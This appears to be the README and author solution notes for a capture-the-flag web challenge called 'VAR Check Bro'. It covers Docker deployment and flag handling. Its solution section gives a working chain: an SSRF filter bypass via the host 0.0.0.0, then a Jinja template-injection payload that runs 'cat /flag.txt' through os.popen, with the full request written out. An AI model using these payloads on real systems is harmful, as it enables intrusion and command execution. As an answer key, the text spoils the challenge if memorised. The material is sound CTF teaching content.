# var_check_bro

**Category:** Web
**Difficulty:** Hard
**Port:** 8007

## Player brief

> VAR Check Bro is Infodays 2026's official Video Assistant Referee portal.
> Submit a highlight URL and the referees will fetch it for review.
> The flag lives at `/flag.txt` on the server.

## Deployment

Service is added to the root `docker-compose.yml` as `web-var-check` and exposes port **8007**.

### Flag

The flag is generated **dynamically at container startup**. On each `docker compose up` the entrypoint writes a fresh value like `INFODAYS{var_check_bro_<random-hex>}` to `/flag.txt`.

To pin a flag for a production CTFd instance, set the `FLAG` env var on the service:

```yaml
  web-var-check:
    build: ./challenges/web/var_check_bro
    environment:
      - FLAG=INFODAYS{your_pinned_flag_here}
    ports:
      - "8007:5000"
```

Without the env var, the flag is random per-container — use `docker exec <container> cat /flag.txt` to retrieve it for the scoreboard.

---

## Author notes — intended solution

Two-stage chain: **SSRF filter bypass → SSTI RCE**.

### Stage 1 — SSRF bypass

Public frontend at `/review` fetches a user-supplied URL after validating:

- scheme in `{http, https}`
- hostname string doesn't contain `localhost`, `internal`, `var-internal`, `metadata`
- resolved IPv4 is **not** `is_loopback`, `is_link_local`, `is_multicast`, or `is_reserved`

**Gap:** the IP check forgets `is_unspecified`. `0.0.0.0` is unspecified but not loopback.

On Linux, connecting to `0.0.0.0:<port>` targets services bound to the local loopback. So:

```
http://0:5555/
http://0.0.0.0:5555/
```

both bypass the filter and reach the internal VAR service. (`socket.gethostbyname('0')` returns `'0.0.0.0'`.)

### Stage 2 — SSTI on the internal service

Internal service at `127.0.0.1:5555` has `/review?play=<tag>` which concatenates `play` directly into a template passed to `render_template_string`. Classic server-side template injection.

Payload (URL-encoded into the outer SSRF URL):

```
http://0:5555/review?play={{lipsum.__globals__.os.popen('cat /flag.txt').read()}}
```

Full request to the public frontend:

```
POST /review HTTP/1.1
Host: <ctf-host>:8007
Content-Type: application/x-www-form-urlencoded

video_url=http://0:5555/review?play=%7B%7Blipsum.__globals__.os.popen('cat%20/flag.txt').read()%7D%7D
```

The flag is echoed inside the fetched content preview on the result page.

### Things I considered but rejected

- DNS rebinding (requires attacker infra — not suitable for a timed CTF)
- `@`-in-URL parser confusion (modern `urlparse` handles it safely)
- IPv4-mapped IPv6 literals (blocked by `IPV6_V6ONLY` on Linux by default)
- Explicit `file://` scheme (blocked by scheme allowlist)

The `0.0.0.0` trick is a real bug pattern seen in production SSRF filters and is the intended path.
